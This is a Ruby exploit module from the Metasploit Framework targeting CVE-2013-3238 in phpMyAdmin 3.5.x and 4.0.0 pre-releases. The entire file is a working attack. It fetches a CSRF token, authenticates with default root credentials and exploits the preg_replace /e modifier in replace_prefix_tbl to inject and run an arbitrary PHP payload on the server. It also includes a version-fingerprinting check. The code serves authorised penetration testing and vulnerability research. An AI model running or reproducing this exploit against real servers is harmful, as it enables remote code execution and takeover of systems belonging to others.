##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'phpMyAdmin Authenticated Remote Code Execution via preg_replace()',
      'Description' => %q{
          This module exploits a PREG_REPLACE_EVAL vulnerability in phpMyAdmin's
          replace_prefix_tbl within libraries/mult_submits.inc.php via db_settings.php
          This affects versions 3.5.x < 3.5.8.1 and 4.0.0 < 4.0.0-rc3.
          PHP versions > 5.4.6 are not vulnerable.
      },
      'Author' =>
        [
          'Janek "waraxe" Vind', # Discovery
          'Ben Campbell <eat_meatballs[at]hotmail.co.uk>' # Metasploit Module
        ],
      'License' => MSF_LICENSE,
      'References' =>
        [
          [ 'CVE', '2013-3238' ],
          [ 'PMASA', '2013-2'],
          [ 'waraxe', '2013-SA#103' ],
          [ 'EDB', '25003'],
          [ 'OSVDB', '92793'],
          [ 'URL', 'http://www.waraxe.us/advisory-103.html' ],
          [ 'URL', 'http://www.phpmyadmin.net/home_page/security/PMASA-2013-2.php' ]
        ],
      'Privileged' => false,
      'Platform'   => ['php'],
      'Arch'       => ARCH_PHP,
      'Payload'    =>
        {
          'BadChars' => "&\n=+%",
          # Clear out PMA's error handler so it doesn't lose its mind
          # and cause ENOMEM errors and segfaults in the destructor.
          'Prepend' => "function foo($a,$b,$c,$d,$e){return true;};set_error_handler(foo);"
        },
      'Targets' =>
        [
          [ 'Automatic', { } ],
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Apr 25 2013'))

    register_options(
      [
        OptString.new('TARGETURI', [ true, "Base phpMyAdmin directory path", '/phpmyadmin/']),
        OptString.new('USERNAME', [ true, "Username to authenticate with", 'root']),
        OptString.new('PASSWORD', [ false, "Password to authenticate with", ''])
      ], self.class)
  end

  def check
    begin
      res = send_request_cgi({ 'uri' => normalize_uri(target_uri.path, '/js/messages.php') })
    rescue
      print_error("Unable to connect to server.")
      return CheckCode::Unknown
    end

    if res.code != 200
      print_error("Unable to query /js/messages.php")
      return CheckCode::Unknown
    end

    php_version = res['X-Powered-By']
    if php_version
      print_status("PHP Version: #{php_version}")
      if php_version =~ /PHP\/(\d)\.(\d)\.(\d)/
        if $1.to_i > 5
          return CheckCode::Safe
        else
          if $1.to_i == 5 and $2.to_i > 4
            return CheckCode::Safe
          else
            if $1.to_i == 5 and $2.to_i == 4 and $3.to_i > 6
              return CheckCode::Safe
            end
          end
        end
      end
    else
      print_status("Unknown PHP Version")
    end

    if res.body =~ /pmaversion = '(.*)';/
      print_status("phpMyAdmin version: #{$1}")
      case $1.downcase
        when '3.5.8.1', '4.0.0-rc3'
          return CheckCode::Safe
        when '4.0.0-alpha1', '4.0.0-alpha2', '4.0.0-beta1', '4.0.0-beta2', '4.0.0-beta3', '4.0.0-rc1', '4.0.0-rc2'
          return CheckCode::Vulnerable
        else
          if $1.starts_with? '3.5.'
            return CheckCode::Vulnerable
          end

          return CheckCode::Unknown
      end
    end
  end

  def exploit
    uri = target_uri.path
    print_status("Grabbing CSRF token...")
    response = send_request_cgi({ 'uri' => uri})
    if response.nil?
      fail_with(Exploit::Failure::NotFound, "Failed to retrieve webpage.")
    end

    if (response.body !~ /"token"\s*value="([^"]*)"/)
      fail_with(Exploit::Failure::NotFound, "Couldn't find token. Is URI set correctly?")
    else
      print_good("Retrieved token")
    end

    token = $1
    post = {
      'token' => token,
      'pma_username' => datastore['USERNAME'],
      'pma_password' => datastore['PASSWORD']
    }

    print_status("Authenticating...")

    login = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(uri, 'index.php'),
      'vars_post' => post
    })

    if login.nil?
      fail_with(Exploit::Failure::NotFound, "Failed to retrieve webpage.")
    end

    token = login.headers['Location'].scan(/token=(.*)[&|$]/).flatten.first

    cookies = login.get_cookies

    login_check = send_request_cgi({
      'uri' => normalize_uri(uri, 'index.php'),
      'vars_get' => { 'token' => token },
      'cookie' => cookies
    })

    if login_check.body =~ /Welcome to/
      fail_with(Exploit::Failure::NoAccess, "Authentication failed.")
    else
      print_good("Authentication successful")
    end

    db = rand_text_alpha(3+rand(3))
    exploit_result = send_request_cgi({
      'uri'  => normalize_uri(uri, 'db_structure.php'),
      'method' => 'POST',
      'cookie' => cookies,
      'vars_post' => {
        'query_type' => 'replace_prefix_tbl',
        'db' => db,
        'selected[0]' => db,
        'token' => token,
        'from_prefix' => "/e\0",
        'to_prefix' => payload.encoded,
        'mult_btn' => 'Yes'
      }
    },1)
  end
end
